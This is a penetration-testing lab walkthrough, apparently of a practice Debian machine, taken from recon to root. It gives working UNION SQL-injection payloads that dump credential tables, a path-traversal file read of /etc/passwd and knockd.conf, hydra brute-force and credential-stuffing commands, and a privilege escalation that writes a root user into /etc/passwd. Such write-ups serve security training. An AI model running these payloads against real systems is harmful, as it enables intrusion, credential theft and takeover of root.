### Initial Foothold
Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.149.209
```

Open ports discovered:
- **22** — filtered ssh port-unreach ttl 61
- **80** — HTTP (Apache httpd 2.4.38, Debian)
    - Additional webpages:
        - `http://192.168.149.209/display.php`
        - `http://192.168.149.209/manage.php`
        - `http://192.168.149.209/search.php`
        - `http://192.168.149.209/config.php`
        - `http://192.168.149.209/results.php`
        - `http://192.168.149.209/css/`
        - `http://192.168.149.209/includes/`
    

autorecon returns a bunch of emails with potential usernames infront. Clean them with gedit
```
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

Attempt to login to them with hydra. Reverse the password. Failed. Rockyou.txt also failed.
```
hydra -L users.txt -e nsr 192.168.122.209 http-post-form "/manage.php:username=^USER^&password=^PASS^:Your Login Name or Password is invalid" -V 
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.122.209 http-post-form "/manage.php:username=^USER^&password=^PASS^:Your Login Name or Password is invalid" -V 
```

Explore `http://192.168.149.209/search.php`. The page is vulnerable to UNION-based SQL injection. The payload `' OR 1=1 --` returns all records. Determine the number of columns by iterating through:
```
' UNION SELECT 1,2,3--+      Nothing
' UNION SELECT 1,2,3,4--+    Nothing
' UNION SELECT 1,2,3,4,5--+  Nothing
' UNION SELECT 1,2,3,4,5,6--+   Some results
```

Six columns are confirmed. Extract the database version, schema names, table names, and column names:
```
# Get SQL version
' UNION SELECT @@version, 2, 3, 4, 5, 6 --
ID: 10.3.17-MariaDB-0+deb10u1

# Get database names
search=' UNION SELECT schema_name, 2, 3, 4, 5, 6 FROM information_schema.schemata #
ID: information_schema
ID: Staff
ID: users

# Get tables within `Staff` database
' UNION SELECT table_name, 2, 3, 4, 5, 6 FROM information_schema.tables WHERE table_schema='Staff'#
ID: StaffDetails
ID: Users

# Get column names within `Users` table
' UNION SELECT column_name, 2, 3, 4, 5, 6 FROM information_schema.columns WHERE table_schema='Staff' AND table_name='Users' #
ID: UserID
ID: Username
ID: Password

# Get password from Staff.Users
search=' UNION SELECT CONCAT(Username, ':', Password), 2, 3, 4, 5, 6 FROM Staff.Users #
ID: admin:856f5de590ef37314e7c3bdf6f8a66dc
```

```
# Get tables within `users` database
' UNION SELECT table_name, 2, 3, 4, 5, 6 FROM information_schema.tables WHERE table_schema='users' #
ID: UserDetails

# Get column names within `UserDetails` table
' UNION SELECT column_name, 2, 3, 4, 5, 6 FROM information_schema.columns WHERE table_schema='users' AND table_name='UserDetails' #
ID: id 
ID: firstname 
ID: lastname 
ID: username 
ID: password 
ID: reg_date

' UNION SELECT GROUP_CONCAT(username, ':', password), 2, 3, 4, 5, 6 FROM users.UserDetails #
ID: marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0
```

From crackstation,
```
|856f5de590ef37314e7c3bdf6f8a66dc|md5|transorbital1|
```
admin password is **transorbital1**
Only admin account works on /manage.php

Fuzz the site with admin logged on.
```
ffuf -u 'http://192.168.122.209/manage.php?FUZZ=../../../../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -b 'PHPSESSID=8l3ak8c3ksd8d6mnadpqp7p0ue' -fs 1341
file [Status: 200, Size: 3743, Words: 85, Lines: 95, Duration: 14ms]
```

As port 22 is filtered, we will need to do port knocking to open SSH. The knock sequence is found in `/etc/knockd.conf` via the LFI vulnerability:
```
http://192.168.122.209/manage.php?file=../../../../../../../etc/knockd.conf

[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
```

knock on 7469, 8475 and 9842 with nmap in sequence.
```
for x in 7469 8475 9842; do nmap -Pn -p $x 192.168.122.209; done
PORT     STATE  SERVICE
7469/tcp closed unknown
8475/tcp closed unknown
9842/tcp closed unknown

nmap -sVC -p- -v -T4 -sT --open 192.168.122.209                 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

Create creds.txt based on user tables just now
```
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
```

Run hydra with creds on ssh.
```
hydra -C creds.txt ssh://192.168.122.209
[22][ssh] host: 192.168.122.209   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.122.209   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.122.209   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
```

There is no local.txt in chandler and joeyt and nothing interesting there.
```
janitor@lab-pg-debian10-dc-9-247-072:~$ ls -lah
drwx------  2 janitor janitor 4.0K Dec 29  2019 .secrets-for-putin
janitor@lab-pg-debian10-dc-9-247-072:~$ cd .secrets-for-putin/
janitor@lab-pg-debian10-dc-9-247-072:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
janitor@lab-pg-debian10-dc-9-247-072:~/.secrets-for-putin$ ls ../../
barneyr  bettyr  chandlerb  debian  fredf  janitor  janitor2  jerrym  joeyt  julied  marym  monicag  phoebeb  rachelg  rossg  scoots  tomc  wilmaf
```

Discovered additional passwords and potential users. Add them to seperate lists of users.txt and passwords.txt. Remove chandlerb, janitor and joeyt from users.txt.
Run hydra again. 
```
hydra -L users.txt -P password.txt ssh://192.168.122.209 
[22][ssh] host: 192.168.122.209   login: fredf   password: B4-Tru3-001
```

### Privesc

Sudo -l so check sudo privileges. Found an executable test which has a weird usage of possibly appending. Create an append.txt at /tmp with credentials hacker:pwned. sudo run the executable test and successfully written at /etc/passwd
```
fredf@lab-pg-debian10-dc-9-247-072:~$ sudo -l
User fredf may run the following commands on lab-pg-debian10-dc-9-247-072
    (root) NOPASSWD: /opt/devstuff/dist/test/test
fredf@lab-pg-debian10-dc-9-247-072:/opt/devstuff/dist/test$ ./test
Usage: python test.py read append

fredf@lab-pg-debian10-dc-9-247-072:/tmp$ nano append.txt
hacker:$1$iwsCv3nr$A8ZFYPVvSE4O0kVpjszuO1:0:0:root:/root:/bin/bash
fredf@lab-pg-debian10-dc-9-247-072:/opt/devstuff/dist/test$ sudo ./test /tmp/append.txt /etc/passwd
```

su hacker. Obtain root.




